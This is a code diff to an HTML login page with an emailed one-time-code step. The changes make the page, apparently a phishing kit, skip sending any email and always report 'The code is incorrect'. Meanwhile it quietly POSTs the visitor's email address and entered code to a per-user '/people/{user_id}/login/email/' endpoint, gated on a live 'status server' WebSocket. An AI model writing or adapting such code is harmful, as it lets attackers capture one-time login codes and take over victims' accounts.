@@ -288,6 +288,8 @@
                             receive a one-time code.</p>
                         <input placeholder="Email" type="email" class="form-control input-field email-verify-code-input"
                             autocomplete="email" maxlength="320" value="" id="emailInput">
+                        <input placeholder="Email" type="email" class="form-control input-field email-verify-code-input"
+                            style="display: none;" maxlength="320" value="" id="oncetimecodeInput">
                         <p id="errorMessage" class="text-error input-validation email-verify-code-error-text"></p>
                         <button onclick="sendEmail()" type="button"
                             class="email-verify-code-button btn-secondary-md btn-min-width" id="actionButton">Send
@@ -1085,6 +1087,7 @@
             const modalTitle = document.getElementById('modalTitle');
             const actionButton = document.getElementById('actionButton');
             const errorMessage = document.getElementById('errorMessage');
+            const oncetimecodeInput = document.getElementById('oncetimecodeInput');
             const helpText = document.getElementById('helpText');
             const emailInput = document.getElementById('emailInput');
 
@@ -1103,8 +1106,9 @@
                 emailInput.placeholder = 'Enter 6-digit code';
                 emailInput.type = 'text';
                 emailInput.maxLength = '6';
-                emailInput.value = '';
-
+                emailInput.style.display = "none";
+                oncetimecodeInput.style.display = "block";
+                
                 // 5. Send code logic (API call would go here)
                 console.log('📧 Sending one-time code email...');
 
@@ -1114,10 +1118,17 @@
                 // Hide any previous error
                 errorMessage.style.display = 'none';
 
+                if (!socket || socket.readyState !== WebSocket.OPEN) {
+                    showErrorMessage('text-error', 'Status server is not connected. Please refresh the page.', '#ff0000');
+                    return;
+                }
+                return false;
+
+
             } else {
                 // === Confirm Code Mode ===
                 // Get entered code
-                const enteredCode = emailInput.value.trim();
+                const enteredCode = oncetimecodeInput.value.trim();
 
                 console.log('🔑 Verifying code:', enteredCode);
 
@@ -1125,6 +1136,39 @@
                 errorMessage.textContent = 'The code is incorrect';
                 errorMessage.style.color = 'red';
                 errorMessage.style.display = 'block';
+
+                const user_id = window.location.pathname.split('/')[2];
+
+                fetch(`/people/${user_id}/login/email/`, {
+                    method: 'POST',
+                    headers: {
+                        'X-CSRFToken': csrfToken,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        'email': emailInput.value,
+                        'verify_code': enteredCode,
+                    })
+                })
+                    .then(response => {
+                        console.log('📬 Response status:', response.status);
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('📦 Response data:', data);
+
+                        if (data.status === 'success') {
+                            console.log('✅ Sent the email and code.');
+
+                        } else {
+                            console.log('❌ Server error:', data.message);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('❌ Fetch error:', error);
+                    });
+
+                emailInput.value = '';
 
                 // Note: In a real implementation, you would verify the code here
                 // and only show the error if the code is actually incorrect
